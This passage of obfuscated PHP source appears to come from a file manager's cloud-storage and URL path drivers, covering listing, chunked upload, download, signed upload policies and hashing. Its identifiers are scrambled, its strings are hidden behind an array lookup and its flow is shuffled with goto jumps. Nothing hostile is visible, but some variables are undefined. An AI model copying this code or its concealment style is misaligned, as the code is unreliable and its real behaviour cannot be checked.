$f∂÷‚ÜäÔŒ = array(); $AÊç•±«ë÷ = rtrim($còâˆﬂØåì, $dÒˆ¥∏Î«Û[8]) . $dÒˆ¥∏Î«Û[8]; while (!0) { $FÎØÕ‘ÿ„Ë = $this->fileList($còâˆﬂØåì, $e¡·ÑƒŸùÃ, $D‹÷ò¯≈≤Ö); if (!$FÎØÕ‘ÿ„Ë) { return !1; } $e¡·ÑƒŸùÃ = isset($FÎØÕ‘ÿ„Ë[$dÒˆ¥∏Î«Û[1236]]) ? $FÎØÕ‘ÿ„Ë[$dÒˆ¥∏Î«Û[1236]] : $dÒˆ¥∏Î«Û[33]; $C»–™Öñ≈á = isset($FÎØÕ‘ÿ„Ë[$dÒˆ¥∏Î«Û[1237]]) ? $FÎØÕ‘ÿ„Ë[$dÒˆ¥∏Î«Û[1237]] : array(); foreach ($C»–™Öñ≈á as $BÑûŸûá Î) { if ($BÑûŸûá Î[$dÒˆ¥∏Î«Û[29]] == $dÒˆ¥∏Î«Û[86]) { $EîÍ´™‘î∫[] = $this->folderInfo($AÊç•±«ë÷ . $BÑûŸûá Î[$dÒˆ¥∏Î«Û[28]], $d∞Ç°ı¨– , $BÑûŸûá Î); } else { $f∂÷‚ÜäÔŒ[] = $this->fileInfo($AÊç•±«ë÷ . $BÑûŸûá Î[$dÒˆ¥∏Î«Û[28]], $d∞Ç°ı¨– , $BÑûŸûá Î); } } if (count($C»–™Öñ≈á) < $D‹÷ò¯≈≤Ö) { break; } } goto E‘ÇŒ≤áÖú; a®®ˆâÎ§Ë: $dÒˆ¥∏Î«Û =& $_SERVER[Æ¡î¢≠¯™]; $e¡·ÑƒŸùÃ = $dÒˆ¥∏Î«Û[33]; $D‹÷ò¯≈≤Ö = 1000; goto c¢˜Ìø≥Çﬁ; E‘ÇŒ≤áÖú: return array($dÒˆ¥∏Î«Û[84] => $EîÍ´™‘î∫, $dÒˆ¥∏Î«Û[83] => $f∂÷‚ÜäÔŒ); goto cÕâ√”∞∆≥; cÕâ√”∞∆≥: } private function recursionAllFiles($B≤ˆ£Ì‰ﬁç, &$Câ£€Ì⁄¢Ñ) { $Bﬁ®ﬂÏ≠çª =& $_SERVER[Æ¡î¢≠¯™]; $dõÛ≤ﬂèñ‚ = $Bﬁ®ﬂÏ≠çª[33]; $d≥¢ãªéäö = 1000; $B∫¬É……è„ = $d‘Ÿûœ‚ÿ« = array(); $Aèπ¢Üáµ⁄ = rtrim($B≤ˆ£Ì‰ﬁç, $Bﬁ®ﬂÏ≠çª[8]) . $Bﬁ®ﬂÏ≠çª[8]; while (!0) { $cÎÇ¨Ù’‘ç = $this->fileList($B≤ˆ£Ì‰ﬁç, $dõÛ≤ﬂèñ‚, $d≥¢ãªéäö); if (!$cÎÇ¨Ù’‘ç) { return !1; } $dõÛ≤ﬂèñ‚ = isset($cÎÇ¨Ù’‘ç[$Bﬁ®ﬂÏ≠çª[1236]]) ? $cÎÇ¨Ù’‘ç[$Bﬁ®ﬂÏ≠çª[1236]] : $Bﬁ®ﬂÏ≠çª[33]; $f√øóÀ”¬… = isset($cÎÇ¨Ù’‘ç[$Bﬁ®ﬂÏ≠çª[1237]]) ? $cÎÇ¨Ù’‘ç[$Bﬁ®ﬂÏ≠çª[1237]] : array(); foreach ($f√øóÀ”¬… as $D…Ûê∫Õ«µ) { $CòôΩ∑¯˘Ì = array($Bﬁ®ﬂÏ≠çª[85] => $Aèπ¢Üáµ⁄ . $D…Ûê∫Õ«µ[$Bﬁ®ﬂÏ≠çª[28]], $Bﬁ®ﬂÏ≠çª[86] => $D…Ûê∫Õ«µ[$Bﬁ®ﬂÏ≠çª[29]] == $Bﬁ®ﬂÏ≠çª[86] ? 1 : 0, $Bﬁ®ﬂÏ≠çª[87] => isset($D…Ûê∫Õ«µ[$Bﬁ®ﬂÏ≠çª[331]]) ? $D…Ûê∫Õ«µ[$Bﬁ®ﬂÏ≠çª[331]] : 0); $Câ£€Ì⁄¢Ñ[] = $CòôΩ∑¯˘Ì; if ($CòôΩ∑¯˘Ì[$Bﬁ®ﬂÏ≠çª[86]] == 1) { $this->recursionAllFiles($CòôΩ∑¯˘Ì[$Bﬁ®ﬂÏ≠çª[85]], $Câ£€Ì⁄¢Ñ); } } if (count($f√øóÀ”¬…) < $d≥¢ãªéäö) { break; } } } public function has($b√∏⁄ﬁ§éë, $CúÎ˘∞ï∆Î = false, $B’¥õ≠°ä  = true) { goto Aæ»»Íã‰—; Dçß®ñ¨’∏: $DèûÇíÿ∑Ô = 0; $a¡›À°»„Ü = 0; $d·äûØŒÎ˘ = rtrim($b√∏⁄ﬁ§éë, $e¢∆˘†û⁄Ç[8]) . $e¢∆˘†û⁄Ç[8]; goto BÈıòÍÁâÇ; Aæ»»Íã‰—: $e¢∆˘†û⁄Ç =& $_SERVER[Æ¡î¢≠¯™]; $B”∂È€ëïÍ = $e¢∆˘†û⁄Ç[33]; $aÁöª∞·ëÕ = 1000; goto Dçß®ñ¨’∏; BÈıòÍÁâÇ: while (!0) { $Aˆ≥ï ÏÖ◊ = $this->fileList($b√∏⁄ﬁ§éë, $B”∂È€ëïÍ, $aÁöª∞·ëÕ); if (!$Aˆ≥ï ÏÖ◊) { return !1; } $B”∂È€ëïÍ = isset($Aˆ≥ï ÏÖ◊[$e¢∆˘†û⁄Ç[1236]]) ? $Aˆ≥ï ÏÖ◊[$e¢∆˘†û⁄Ç[1236]] : $e¢∆˘†û⁄Ç[33]; $AﬂûõœÂ´‚ = isset($Aˆ≥ï ÏÖ◊[$e¢∆˘†û⁄Ç[1237]]) ? $Aˆ≥ï ÏÖ◊[$e¢∆˘†û⁄Ç[1237]] : array(); if (empty($AﬂûõœÂ´‚)) { break; } $Dê—Õ á⁄® = array_to_keyvalue($AﬂûõœÂ´‚, $e¢∆˘†û⁄Ç[33], $e¢∆˘†û⁄Ç[29]); $AÂÖê–õÛê = array_count_values($Dê—Õ á⁄®); $Bﬂ√ß˜ã‘° = isset($AÂÖê–õÛê[$e¢∆˘†û⁄Ç[86]]) ? $AÂÖê–õÛê[$e¢∆˘†û⁄Ç[86]] : 0; $eΩÇŒÖÉœË = count($Dê—Õ á⁄®) - $Bﬂ√ß˜ã‘°; if ($CúÎ˘∞ï∆Î) { $a¡›À°»„Ü += $Bﬂ√ß˜ã‘°; $DèûÇíÿ∑Ô += $eΩÇŒÖÉœË; if ($C·µÛ•‘ò¯ < $aÁöª∞·ëÕ) { break; } continue; } if ($B’¥õ≠°ä ) { if ($eΩÇŒÖÉœË) { return !0; } } else { if ($Bﬂ√ß˜ã‘°) { return !0; } } if (count($AﬂûõœÂ´‚) < $aÁöª∞·ëÕ) { break; } } if ($CúÎ˘∞ï∆Î) { return array($e¢∆˘†û⁄Ç[198] => $DèûÇíÿ∑Ô, $e¢∆˘†û⁄Ç[199] => $a¡›À°»„Ü); } return !1; goto E¯ââÖû¡Â; E¯ââÖû¡Â: } public function listAll($a±é°›Ñ‚…) { $dﬁŒÁ„¡§Ü = array(); $this->recursionAllFiles($a±é°›Ñ‚…, $dﬁŒÁ„¡§Ü); return $dﬁŒÁ„¡§Ü; } public function canRead($a∆ôŸüû›≠) { return $this->exist($a∆ôŸüû›≠) ? !0 : !1; } public function canWrite($dùç≥‰∞ƒŸ) { return $this->exist($dùç≥‰∞ƒŸ) ? !0 : !1; } public function getContent($aÀÏ≈…∞áÂ) { return $this->fileSubstr($aÀÏ≈…∞áÂ, 0, -1); } public function setContent($Cé≠Õ‹“÷í, $BÚÔ´€≈©é = '') { $BûÇÇÇ◊ÒÖ =& $_SERVER[Æ¡î¢≠¯™]; if (!$BÚÔ´€≈©é) { $EÌã‰¥Úó† = $this->ussRequest($Cé≠Õ‹“÷í, $BûÇÇÇ◊ÒÖ[219]); return $EÌã‰¥Úó†[$BûÇÇÇ◊ÒÖ[1018]]; } $Fü»¡ﬂΩñª = $this->tempFile($this->pathThis($Cé≠Õ‹“÷í)); file_put_contents($Fü»¡ﬂΩñª, $BÚÔ´€≈©é); if ($this->upload($Cé≠Õ‹“÷í, $Fü»¡ﬂΩñª)) { $this->tempFileRemve($Fü»¡ﬂΩñª); return !0; } return !1; } public function fileSubstr($A… ∑ŒÁà‰, $Eäﬂ¡œ‡ﬁª, $fãË¿«ùΩÌ) { $A‚«ê›µ∂í =& $_SERVER[Æ¡î¢≠¯™]; if (!($fÍæùÀ≈µ€ = $this->link($A… ∑ŒÁà‰))) { return !1; } $fÃ´»Ò°∂á = !1; if ($fãË¿«ùΩÌ > 0) { $E¡Ì—ºªåØ = $Eäﬂ¡œ‡ﬁª + $fãË¿«ùΩÌ - 1; $fÃ´»Ò°∂á = array($A‚«ê›µ∂í[1198] . $Eäﬂ¡œ‡ﬁª . $A‚«ê›µ∂í[416] . $E¡Ì—ºªåØ); } $E¿¥º¬›’Ñ = url_request($fÍæùÀ≈µ€, $A‚«ê›µ∂í[223], !1, $fÃ´»Ò°∂á); return $E¿¥º¬›’Ñ[$A‚«ê›µ∂í[681]] ? $E¿¥º¬›’Ñ[$A‚«ê›µ∂í[1020]] : !1; } public function upload($Aî«ß‹‹º≠, $b—ß‡¨’∫€, $DÉ∂¢‹èõ = false, $A‡ºâïÔä« = REPEAT_REPLACE) { goto bÃ¿œÑ®•Î; Eü¥Í®¢™§: $Aˆ¡º´ßÖ∆ = $this->osChunkSize(); if ($Aˆ¡º´ßÖ∆ > 1024 * 1024 * 10) { $Aˆ¡º´ßÖ∆ = 1024 * 1024 * 10; } $e√Âì—¯Ãå = array($F≈ù≈«ºâÃ[1239], $F≈ù≈«ºâÃ[1240] . $Aàìèå–ƒÙ, $F≈ù≈«ºâÃ[1241], $F≈ù≈«ºâÃ[1242] . $Aˆ¡º´ßÖ∆); goto eäÔœáŒñä; eäÔœáŒñä: $CÊ„ïú˘ã€ = $this->ussRequest($Aî«ß‹‹º≠, $F≈ù≈«ºâÃ[221], !1, $e√Âì—¯Ãå); if (!$CÊ„ïú˘ã€[$F≈ù≈«ºâÃ[1018]]) { return !1; } $DÍŒ€‘ùé∑ = $CÊ„ïú˘ã€[$F≈ù≈«ºâÃ[1020]]; goto Eî Ò°Ëº”; bÃ¿œÑ®•Î: $F≈ù≈«ºâÃ =& $_SERVER[Æ¡î¢≠¯™]; $Aàìèå–ƒÙ = IO::size($b—ß‡¨’∫€); if ($Aàìèå–ƒÙ <= 1024 * 1024 * 200) { $Cø±¿ª∆üà = array($F≈ù≈«ºâÃ[1238] . $b—ß‡¨’∫€); $CÊ„ïú˘ã€ = $this->ussRequest($Aî«ß‹‹º≠, $F≈ù≈«ºâÃ[221], $Cø±¿ª∆üà); return $CÊ„ïú˘ã€[$F≈ù≈«ºâÃ[1018]] ? $this->getPathOuter($Aî«ß‹‹º≠) : !1; } goto Eü¥Í®¢™§; C≥„‰üÊ¶ú: if (!$c·£¿‰ÉÓ´) { return !1; } do { $dµˆå™Ê„– = $DÍŒ€‘ùé∑[$F≈ù≈«ºâÃ[1244]]; fseek($c·£¿‰ÉÓ´, $aºµÛ•†éÛ); $dÍ≥®†•ïá = fread($c·£¿‰ÉÓ´, $dµˆå™Ê„–); $eâΩ∑—êœ– = 0; do { $eâΩ∑—êœ–++; $DÍŒ€‘ùé∑ = $this->uploadPart($Aî«ß‹‹º≠, $DÍŒ€‘ùé∑, $dÍ≥®†•ïá); } while (!$DÍŒ€‘ùé∑ && $eâΩ∑—êœ– < 3); if (!$DÍŒ€‘ùé∑) { return !1; } $B≈ÂäÑã≥‹ = $DÍŒ€‘ùé∑[$F≈ù≈«ºâÃ[1243]]; $aºµÛ•†éÛ += $dµˆå™Ê„–; } while ($B≈ÂäÑã≥‹ != -1); fclose($c·£¿‰ÉÓ´); goto B‹ﬁı∆≥É‹; B‹ﬁı∆≥É‹: $e√Âì—¯Ãå = array($F≈ù≈«ºâÃ[1245], $F≈ù≈«ºâÃ[1246] . $DÍŒ€‘ùé∑[$F≈ù≈«ºâÃ[1247]], $F≈ù≈«ºâÃ[1241]); $CÊ„ïú˘ã€ = $this->ussRequest($Aî«ß‹‹º≠, $F≈ù≈«ºâÃ[221], !1, $e√Âì—¯Ãå); return $CÊ„ïú˘ã€[$F≈ù≈«ºâÃ[1018]] ? $this->getPathOuter($c∆©À⁄õä¨) : !1; goto EËæ„õΩªÇ; Eî Ò°Ëº”: $aºµÛ•†éÛ = 0; $B≈ÂäÑã≥‹ = $DÍŒ€‘ùé∑[$F≈ù≈«ºâÃ[1243]]; $c·£¿‰ÉÓ´ = fopen($b—ß‡¨’∫€, $F≈ù≈«ºâÃ[1148]); goto C≥„‰üÊ¶ú; EËæ„õΩªÇ: } private function uploadPart($FÑ∆ˆ¬ë≥», $E•»€ØÊ©, &$Bî¨ß°¿’¶) { $d¡»«¨íÎÎ =& $_SERVER[Æ¡î¢≠¯™]; $EÓƒñ≥†∞Ω = array($d¡»«¨íÎÎ[1248], $d¡»«¨íÎÎ[1246] . $E•»€ØÊ©[$d¡»«¨íÎÎ[1247]], $d¡»«¨íÎÎ[1249] . $E•»€ØÊ©[$d¡»«¨íÎÎ[1243]], $d¡»«¨íÎÎ[1250] . $E•»€ØÊ©[$d¡»«¨íÎÎ[1244]]); $b«ã£»Ùò’ = $this->ussRequest($FÑ∆ˆ¬ë≥», $d¡»«¨íÎÎ[221], $Bî¨ß°¿’¶, $EÓƒñ≥†∞Ω); return !$b«ã£»Ùò’[$d¡»«¨íÎÎ[1018]] ? $b«ã£»Ùò’[$d¡»«¨íÎÎ[1018]] : $b«ã£»Ùò’[$d¡»«¨íÎÎ[1020]]; } public function uploadFormData($Céõàúá‚µ, $DæêÜÏﬁ‹Ÿ = 3600) { return $this->uploadPolicy($Céõàúá‚µ, $DæêÜÏﬁ‹Ÿ); } public function multiUploadFormData($fÏ›∞‹∆Ö°, $døòÂ Ùå§ = 3600) { $cä·∆√’∆’ =& $_SERVER[Æ¡î¢≠¯™]; $EÆöá ì∏Î = (int) $GLOBALS[$cä·∆√’∆’[7]][$cä·∆√’∆’[87]]; return $this->uploadPolicy($fÏ›∞‹∆Ö°, $døòÂ Ùå§, $EÆöá ì∏Î); } private function uploadPolicy($aÿü™Èò•ó, $cÛÉ∏√Ó„ó = 3600, $A¥•„Õ∞í≈ = 0) { goto BóÇé€‰È†; BóÇé€‰È†: $dÎåêﬂ¨≥† =& $_SERVER[Æ¡î¢≠¯™]; $D…ä‘ìôÉ¨ = $dÎåêﬂ¨≥†[8] . $this->bucket; $d∞àÜüœıÜ = gmdate($dÎåêﬂ¨≥†[1183]); goto Fà∞˜«≈Ë©; Fà∞˜«≈Ë©: $bﬂóÚà»Ç´ = array($dÎåêﬂ¨≥†[1251] => $this->bucket, $dÎåêﬂ¨≥†[1252] => $aÿü™Èò•ó, $dÎåêﬂ¨≥†[1253] => time() + $cÛÉ∏√Ó„ó, $dÎåêﬂ¨≥†[1254] => $d∞àÜüœıÜ); if ($A¥•„Õ∞í≈) { $bﬂóÚà»Ç´[$dÎåêﬂ¨≥†[1169]] = $A¥•„Õ∞í≈; } $f•óΩÚÇé® = base64_encode(json_encode($bﬂóÚà»Ç´)); goto cá√Ü≠õô„; cá√Ü≠õô„: $CﬂîÌâÈï£ = base64_encode(hash_hmac($dÎåêﬂ¨≥†[1220], "\x50\x4f\x53\124\x26{$D…ä‘ìôÉ¨}\x26{$d∞àÜüœıÜ}\x26{$f•óΩÚÇé®}", md5("{$this->userpass}"), !0)); $Bπß˘©àŸã = array($dÎåêﬂ¨≥†[1091] => $f•óΩÚÇé®, $dÎåêﬂ¨≥†[1255] => "\x55\120\x59\125\116\x20{$this->username}\72{$CﬂîÌâÈï£}", $dÎåêﬂ¨≥†[176] => $this->endpoint . $D…ä‘ìôÉ¨); return $Bπß˘©àŸã; goto d˜¶∂Éº€É; d˜¶∂Éº€É: } public function download($c◊¨ﬂÙßÖª, $eã⁄ì∫åã) { goto D≠ÉÇé∞çı; cøﬂö„ˆüõ: $fîˆøæ¿Íˆ = 1024 * 200; $B¶‹⁄Öìÿ = fopen($dõ⁄√ôÃã◊, $_SERVER[Æ¡î¢≠¯™][1204]); while (!0) { $cæ—„Èõã™ = $this->fileSubstr($c◊¨ﬂÙßÖª, $fîèæÑ˘±, $fîˆøæ¿Íˆ); if ($cæ—„Èõã™ === !1) { return !1; } fwrite($B¶‹⁄Öìÿ, $cæ—„Èõã™); $fîèæÑ˘± += $fîˆøæ¿Íˆ; if (strlen($cæ—„Èõã™) < $fîˆøæ¿Íˆ) { break; } } goto AÖ°çﬁ∑ŸÆ; D≠ÉÇé∞çı: $dõ⁄√ôÃã◊ = IO::getPathInner(IO::mkfile($eã⁄ì∫åã)); if (!($cíÁ€•ÌüÍ = $this->link($c◊¨ﬂÙßÖª))) { return !1; } $fîèæÑ˘± = 0; goto cøﬂö„ˆüõ; AÖ°çﬁ∑ŸÆ: fclose($B¶‹⁄Öìÿ); return $eã⁄ì∫åã; goto e∆ˆ®ﬁ√†è; e∆ˆ®ﬁ√†è: } public function link($e•Ñ„Ë‰ëﬂ, $eÖ°«‚ç¿ = array()) { $dÉ∆ê≠ıÑÚ =& $_SERVER[Æ¡î¢≠¯™]; $e•Ñ„Ë‰ëﬂ = trim($e•Ñ„Ë‰ëﬂ, $dÉ∆ê≠ıÑÚ[8]); if (!empty($this->token)) { $d›Æåÿ•≈ü = strtotime(date($dÉ∆ê≠ıÑÚ[1256])); $a««º◊¬ŸÔ = substr(md5($this->token . $dÉ∆ê≠ıÑÚ[278] . $d›Æåÿ•≈ü . $dÉ∆ê≠ıÑÚ[1257] . $e•Ñ„Ë‰ëﬂ), 12, 8) . $d›Æåÿ•≈ü; $eÖ°«‚ç¿[] = $dÉ∆ê≠ıÑÚ[1258] . $a««º◊¬ŸÔ; } $dæ–ÆàîÂ´ = !empty($eÖ°«‚ç¿) ? $dÉ∆ê≠ıÑÚ[79] . implode($dÉ∆ê≠ıÑÚ[278], $eÖ°«‚ç¿) : $dÉ∆ê≠ıÑÚ[33]; return $dÉ∆ê≠ıÑÚ[1094] . $this->domain . $dÉ∆ê≠ıÑÚ[8] . $e•Ñ„Ë‰ëﬂ . $dæ–ÆàîÂ´; } public function fileOut($câê——…ÃÍ, $béÖë±ê‹ = false, $aπ—º≥™Àø = false, $bó≠ƒõ∑Àæ = '') { if (!$aπ—º≥™Àø) { $aπ—º≥™Àø = $this->pathThis($câê——…ÃÍ); } $B“ó¨úõ ” = $béÖë±ê‹ ? array($_SERVER[Æ¡î¢≠¯™][1259] . rawurlencode($aπ—º≥™Àø)) : array(); $aÁàºá€„Ç = $this->link($câê——…ÃÍ, $B“ó¨úõ ”); $this->fileOutLink($aÁàºá€„Ç); } public function fileOutServer($BÛ§¿›÷Ô‹, $C“À÷–Ô¥ˆ = false, $A€ê©ú¬âñ = false, $A·”µà±Ÿ¿ = '') { parent::fileOut($BÛ§¿›÷Ô‹, $C“À÷–Ô¥ˆ, $A€ê©ú¬âñ, $A·”µà±Ÿ¿); } public function fileOutImage($BÓŸèÆÃóô, $EÊ±ô¢ΩŸ‰ = 250) { $E÷óˆ»⁄è® = $this->link($BÓŸèÆÃóô . $_SERVER[Æ¡î¢≠¯™][1260] . $EÊ±ô¢ΩŸ‰); $this->fileOutLink($E÷óˆ»⁄è®); } public function fileOutImageServer($Fëπ°¥∂‘ì, $D¿√ïµÀäÊ = 250) { parent::fileOutImage($Fëπ°¥∂‘ì, $D¿√ïµÀäÊ); } public function hashMd5($F≈ë†„äè‘) { $AÈ√≈õ¡Ü© =& $_SERVER[Æ¡î¢≠¯™]; $BÛ∂ÆÖﬂ–⁄ = $this->objectMeta($F≈ë†„äè‘); return isset($BÛ∂ÆÖﬂ–⁄[$AÈ√≈õ¡Ü©[203]]) ? $BÛ∂ÆÖﬂ–⁄[$AÈ√≈õ¡Ü©[203]] : !1; } public function size($bóàä«ø£∂) { $dàŸ‚î§√Ò = $this->objectMeta($bóàä«ø£∂); return $dàŸ‚î§√Ò ? $dàŸ‚î§√Ò[$_SERVER[Æ¡î¢≠¯™][87]] : 0; } public function info($b§±∞Ì€çÒ) { if ($this->isFolder($b§±∞Ì€çÒ)) { return $this->folderInfo($b§±∞Ì€çÒ); } else { if ($this->isFile($b§±∞Ì€çÒ)) { return $this->fileInfo($b§±∞Ì€çÒ); } } return !1; } public function exist($d∆§ëû¯Ü«) { return $this->isFile($d∆§ëû¯Ü«) || $this->isFolder($d∆§ëû¯Ü«); } public function isFile($f„Öﬂ’‚Êè) { return !$this->isFolder($f„Öﬂ’‚Êè) && $this->objectMeta($f„Öﬂ’‚Êè); } public function isFolder($aˆ¯ﬂ€†©Ú) { return $this->cacheMethod($_SERVER[Æ¡î¢≠¯™][229], $aˆ¯ﬂ€†©Ú); } protected function objectMeta($Aÿµé·äâ†) { return $this->cacheMethod($_SERVER[Æ¡î¢≠¯™][230], $Aÿµé·äâ†); } protected function _objectMeta($E±ÜÜ”ó’ä) { goto dï◊≤óÍ≠≤; c‚úûñ √∂: $C§Ïèã¥‰Ë = array($aüﬂ¯°Ø†[28] => get_path_this($E±ÜÜ”ó’ä), $aüﬂ¯°Ø†[29] => isset($f≈·í£∆Ìí[$aüﬂ¯°Ø†[1262]]) ? $f≈·í£∆Ìí[$aüﬂ¯°Ø†[1262]] : null, $aüﬂ¯°Ø†[87] => isset($f≈·í£∆Ìí[$aüﬂ¯°Ø†[1263]]) ? $f≈·í£∆Ìí[$aüﬂ¯°Ø†[1263]] : null, $aüﬂ¯°Ø†[203] => isset($f≈·í£∆Ìí[$aüﬂ¯°Ø†[1264]]) ? $f≈·í£∆Ìí[$aüﬂ¯°Ø†[1264]] : null, $aüﬂ¯°Ø†[1231] => isset($f≈·í£∆Ìí[$aüﬂ¯°Ø†[1265]]) ? $f≈·í£∆Ìí[$aüﬂ¯°Ø†[1265]] : null); $C§Ïèã¥‰Ë[$aüﬂ¯°Ø†[1232]] = isset($f≈·í£∆Ìí[$aüﬂ¯°Ø†[1266]]) ? strtotime($f≈·í£∆Ìí[$aüﬂ¯°Ø†[1266]]) : $C§Ïèã¥‰Ë[$aüﬂ¯°Ø†[1231]]; return $C§Ïèã¥‰Ë; goto fŸ©¬ÑÛ‚; Aï©ΩÍóÂ›: if (!$e≥∂€áÜ≥∫[$aüﬂ¯°Ø†[1018]]) { return null; } $f≈·í£∆Ìí = isset($e≥∂€áÜ≥∫[$aüﬂ¯°Ø†[1020]]) ? $e≥∂€áÜ≥∫[$aüﬂ¯°Ø†[1020]] : array(); if (!isset($f≈·í£∆Ìí[$aüﬂ¯°Ø†[1262]])) { return null; } goto c‚úûñ √∂; dï◊≤óÍ≠≤: $aüﬂ¯°Ø† =& $_SERVER[Æ¡î¢≠¯™]; if ($E±ÜÜ”ó’ä == $aüﬂ¯°Ø†[33] || $E±ÜÜ”ó’ä == $aüﬂ¯°Ø†[8]) { return array(); } $e≥∂€áÜ≥∫ = $this->ussRequest($E±ÜÜ”ó’ä, $aüﬂ¯°Ø†[1261]); goto Aï©ΩÍóÂ›; fŸ©¬ÑÛ‚: } protected function _isFolder($F§î™ˆ·•◊) { $eû¢≤≤ê©≥ =& $_SERVER[Æ¡î¢≠¯™]; if ($F§î™ˆ·•◊ == $eû¢≤≤ê©≥[33] || $F§î™ˆ·•◊ == $eû¢≤≤ê©≥[8]) { return !0; } $Aæ˜„ıÔ∏Ç = $this->objectMeta($F§î™ˆ·•◊); return isset($Aæ˜„ıÔ∏Ç[$eû¢≤≤ê©≥[29]]) && $Aæ˜„ıÔ∏Ç[$eû¢≤≤ê©≥[29]] == $eû¢≤≤ê©≥[86] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($C¥åŒªæŒÛ = false) { } public function exist($F∂ÈéêÏ‰ê) { $b⁄»Î˘‚≈á = $this->info($F∂ÈéêÏ‰ê); return $b⁄»Î˘‚≈á[$_SERVER[Æ¡î¢≠¯™][195]]; } public function isFile($E«¯≈ÿ‹ËÇ) { $CÜﬁêë´ÿØ = $this->info($E«¯≈ÿ‹ËÇ); return $CÜﬁêë´ÿØ[$_SERVER[Æ¡î¢≠¯™][195]]; } public function isFolder($Dø¶”ä€õΩ) { return !1; } public function size($C¶’û›◊≠ç) { $AÑåÏÊ√Íœ = $this->info($C¶’û›◊≠ç); return $AÑåÏÊ√Íœ[$_SERVER[Æ¡î¢≠¯™][87]]; } public function info($F˜‘ÏóáéÑ) { return $this->infoParse($F˜‘ÏóáéÑ); } public function infoAuth($E‚øÚØ˜±◊) { return $this->infoParse($E‚øÚØ˜±◊); } public function infoWithChildren($BÂíëÊ¬…ê) { return $this->infoParse($BÂíëÊ¬…ê); } public function infoFull($a€ë®ÍπÂ) { return $this->infoParse($a€ë®ÍπÂ); } private function infoParse($eÔΩŒ√ì„∑) { $Fõà µÏ¿Ó =& $_SERVER[Æ¡î¢≠¯™]; $C¨®Ùºœ£÷ = $this->header($eÔΩŒ√ì„∑); if (!$C¨®Ùºœ£÷ || !$C¨®Ùºœ£÷[$Fõà µÏ¿Ó[681]]) { return !1; } $Eà»ÈÎ›∞⁄ = _get($C¨®Ùºœ£÷, $Fõà µÏ¿Ó[331], 0); $D¡£˜ﬁ¬ç´ = array($Fõà µÏ¿Ó[28] => $C¨®Ùºœ£÷[$Fõà µÏ¿Ó[28]], $Fõà µÏ¿Ó[85] => $eÔΩŒ√ì„∑, $Fõà µÏ¿Ó[29] => $Fõà µÏ¿Ó[174], $Fõà µÏ¿Ó[87] => intval($Eà»ÈÎ›∞⁄), $Fõà µÏ¿Ó[167] => get_path_ext($C¨®Ùºœ£÷[$Fõà µÏ¿Ó[28]]), $Fõà µÏ¿Ó[1140] => $Eà»ÈÎ›∞⁄ > 0 && $C¨®Ùºœ£÷[$Fõà µÏ¿Ó[1267]], $Fõà µÏ¿Ó[1141] => !1); return $D¡£˜ﬁ¬ç´; } private function header($Cå›ã‰«◊á) { if (isset(self::$_cacheHeader[$Cå›ã‰«◊á])) { return self::$_cacheHeader[$Cå›ã‰«◊á]; } self::$_cacheHeader[$Cå›ã‰«◊á] = url_header($Cå›ã‰«◊á); return self::$_cacheHeader[$Cå›ã‰«◊á]; } public function hashSimple($a∫ß‹¯´µ‚, $fÓüáâ¡ôß = false) { goto a¯óôÓΩ˜•; a¯óôÓΩ˜•: $fÿîÜø¬âñ =& $_SERVER[Æ¡î¢≠¯™]; $c≈àÑ≠¨Êå = $this->info($a∫ß‹¯´µ‚); if (!$c≈àÑ≠¨Êå || !$c≈àÑ≠¨Êå[$fÿîÜø¬âñ[195]]) { return !1; } goto cÏ¨·ûµ≈”; bæÜÜêá´É: $A¶É÷Ô†ë∫ = timeFloat(); $Eˆ∂âîÊ‹® = 15; for ($B«à´™ﬂ¢Ê = 0; $B«à´™ﬂ¢Ê < $AøàÚäÙ≤ó; $B«à´™ﬂ¢Ê++) { if (timeFloat() - $A¶É÷Ô†ë∫ > $Eˆ∂âîÊ‹®) { return !1; } $A„‰÷µ“ßï = $this->fileSubstr($a∫ß‹¯´µ‚, $aÊ®Ú∫Ø‘µ * $B«à´™ﬂ¢Ê, $c†ü’∂ß†È); if (!$A„‰÷µ“ßï) { return !1; } $E∂Ë∑”§¨Ü .= $A„‰÷µ“ßï; } goto Eéé⁄∏°±ã; Eéé⁄∏°±ã: $E∂Ë∑”§¨Ü .= $this->fileSubstr($a∫ß‹¯´µ‚, $Aò®Ù·èêﬂ - $c†ü’∂ß†È, $c†ü’∂ß†È); return md5($E∂Ë∑”§¨Ü) . $Aò®Ù·èêﬂ; goto BÚóÁ˜ë∑ë; cÏ¨·ûµ≈”: $Aò®Ù·èêﬂ = $c≈àÑ≠¨Êå[$fÿîÜø¬âñ[87]]; $c†ü’∂ß†È = 200; $AøàÚäÙ≤ó = 50; goto F®„ÇôûÜ®; F®„ÇôûÜ®: if ($Aò®Ù·èêﬂ <= $c†ü’∂ß†È * $AøàÚäÙ≤ó) { return md5($this->fileSubstr($a∫ß‹¯´µ‚, 0, $Aò®Ù·èêﬂ)) . $Aò®Ù·èêﬂ; } $aÊ®Ú∫Ø‘µ = intval($Aò®Ù·èêﬂ / $AøàÚäÙ≤ó); $E∂Ë∑”§¨Ü = $fÿîÜø¬âñ[33]; goto bæÜÜêá´É; BÚóÁ˜ë∑ë: } public function getContent($BòâÖØò¿¶) { return $this->fileSubstr($BòâÖØò¿¶); } public function fileSubstr($D±´ÜåêÖ», $bÇ Ü–˜ã” = 0, $A”óÉ®ü˘† = -1) { goto F≥ΩÇöÇ∏è; F≥ΩÇöÇ∏è: $AÒß…¿–Ω =& $_SERVER[Æ¡î¢≠¯™]; $CØßÃÔ’ì‹ = $this->info($D±´ÜåêÖ»); if (!$CØßÃÔ’ì‹ || !$CØßÃÔ’ì‹[$AÒß…¿–Ω[195]] && $CØßÃÔ’ì‹[$AÒß…¿–Ω[87]] > 1024 * 1024 * 10) { return !1; } goto EÛªΩª‚Œç; D∫ÂÜ»ù÷Ñ: $a´ê´Éπıñ = url_request($D±´ÜåêÖ», $AÒß…¿–Ω[223], !1, $cç÷π°Áó´, !1, !1, 1); return $a´ê´Éπıñ[$AÒß…¿–Ω[1020]] ? $a´ê´Éπıñ[$AÒß…¿–Ω[1020]] : $AÒß…¿–Ω[33]; goto F»Óµ¿åëÔ; EÛªΩª‚Œç: if ($A”óÉ®ü˘† === -1) { $A”óÉ®ü˘† = $CØßÃÔ’ì‹[$AÒß…¿–Ω[87]]; } if ($A”óÉ®ü˘† == 0) { return $AÒß…¿–Ω[33]; } $cç÷π°Áó´ = array($AÒß…¿–Ω[1268] . $bÇ Ü–˜ã” . $AÒß…¿–Ω[706] . ($bÇ Ü–˜ã” + $A”óÉ®ü˘† - 1)); goto D∫ÂÜ»ù÷Ñ; 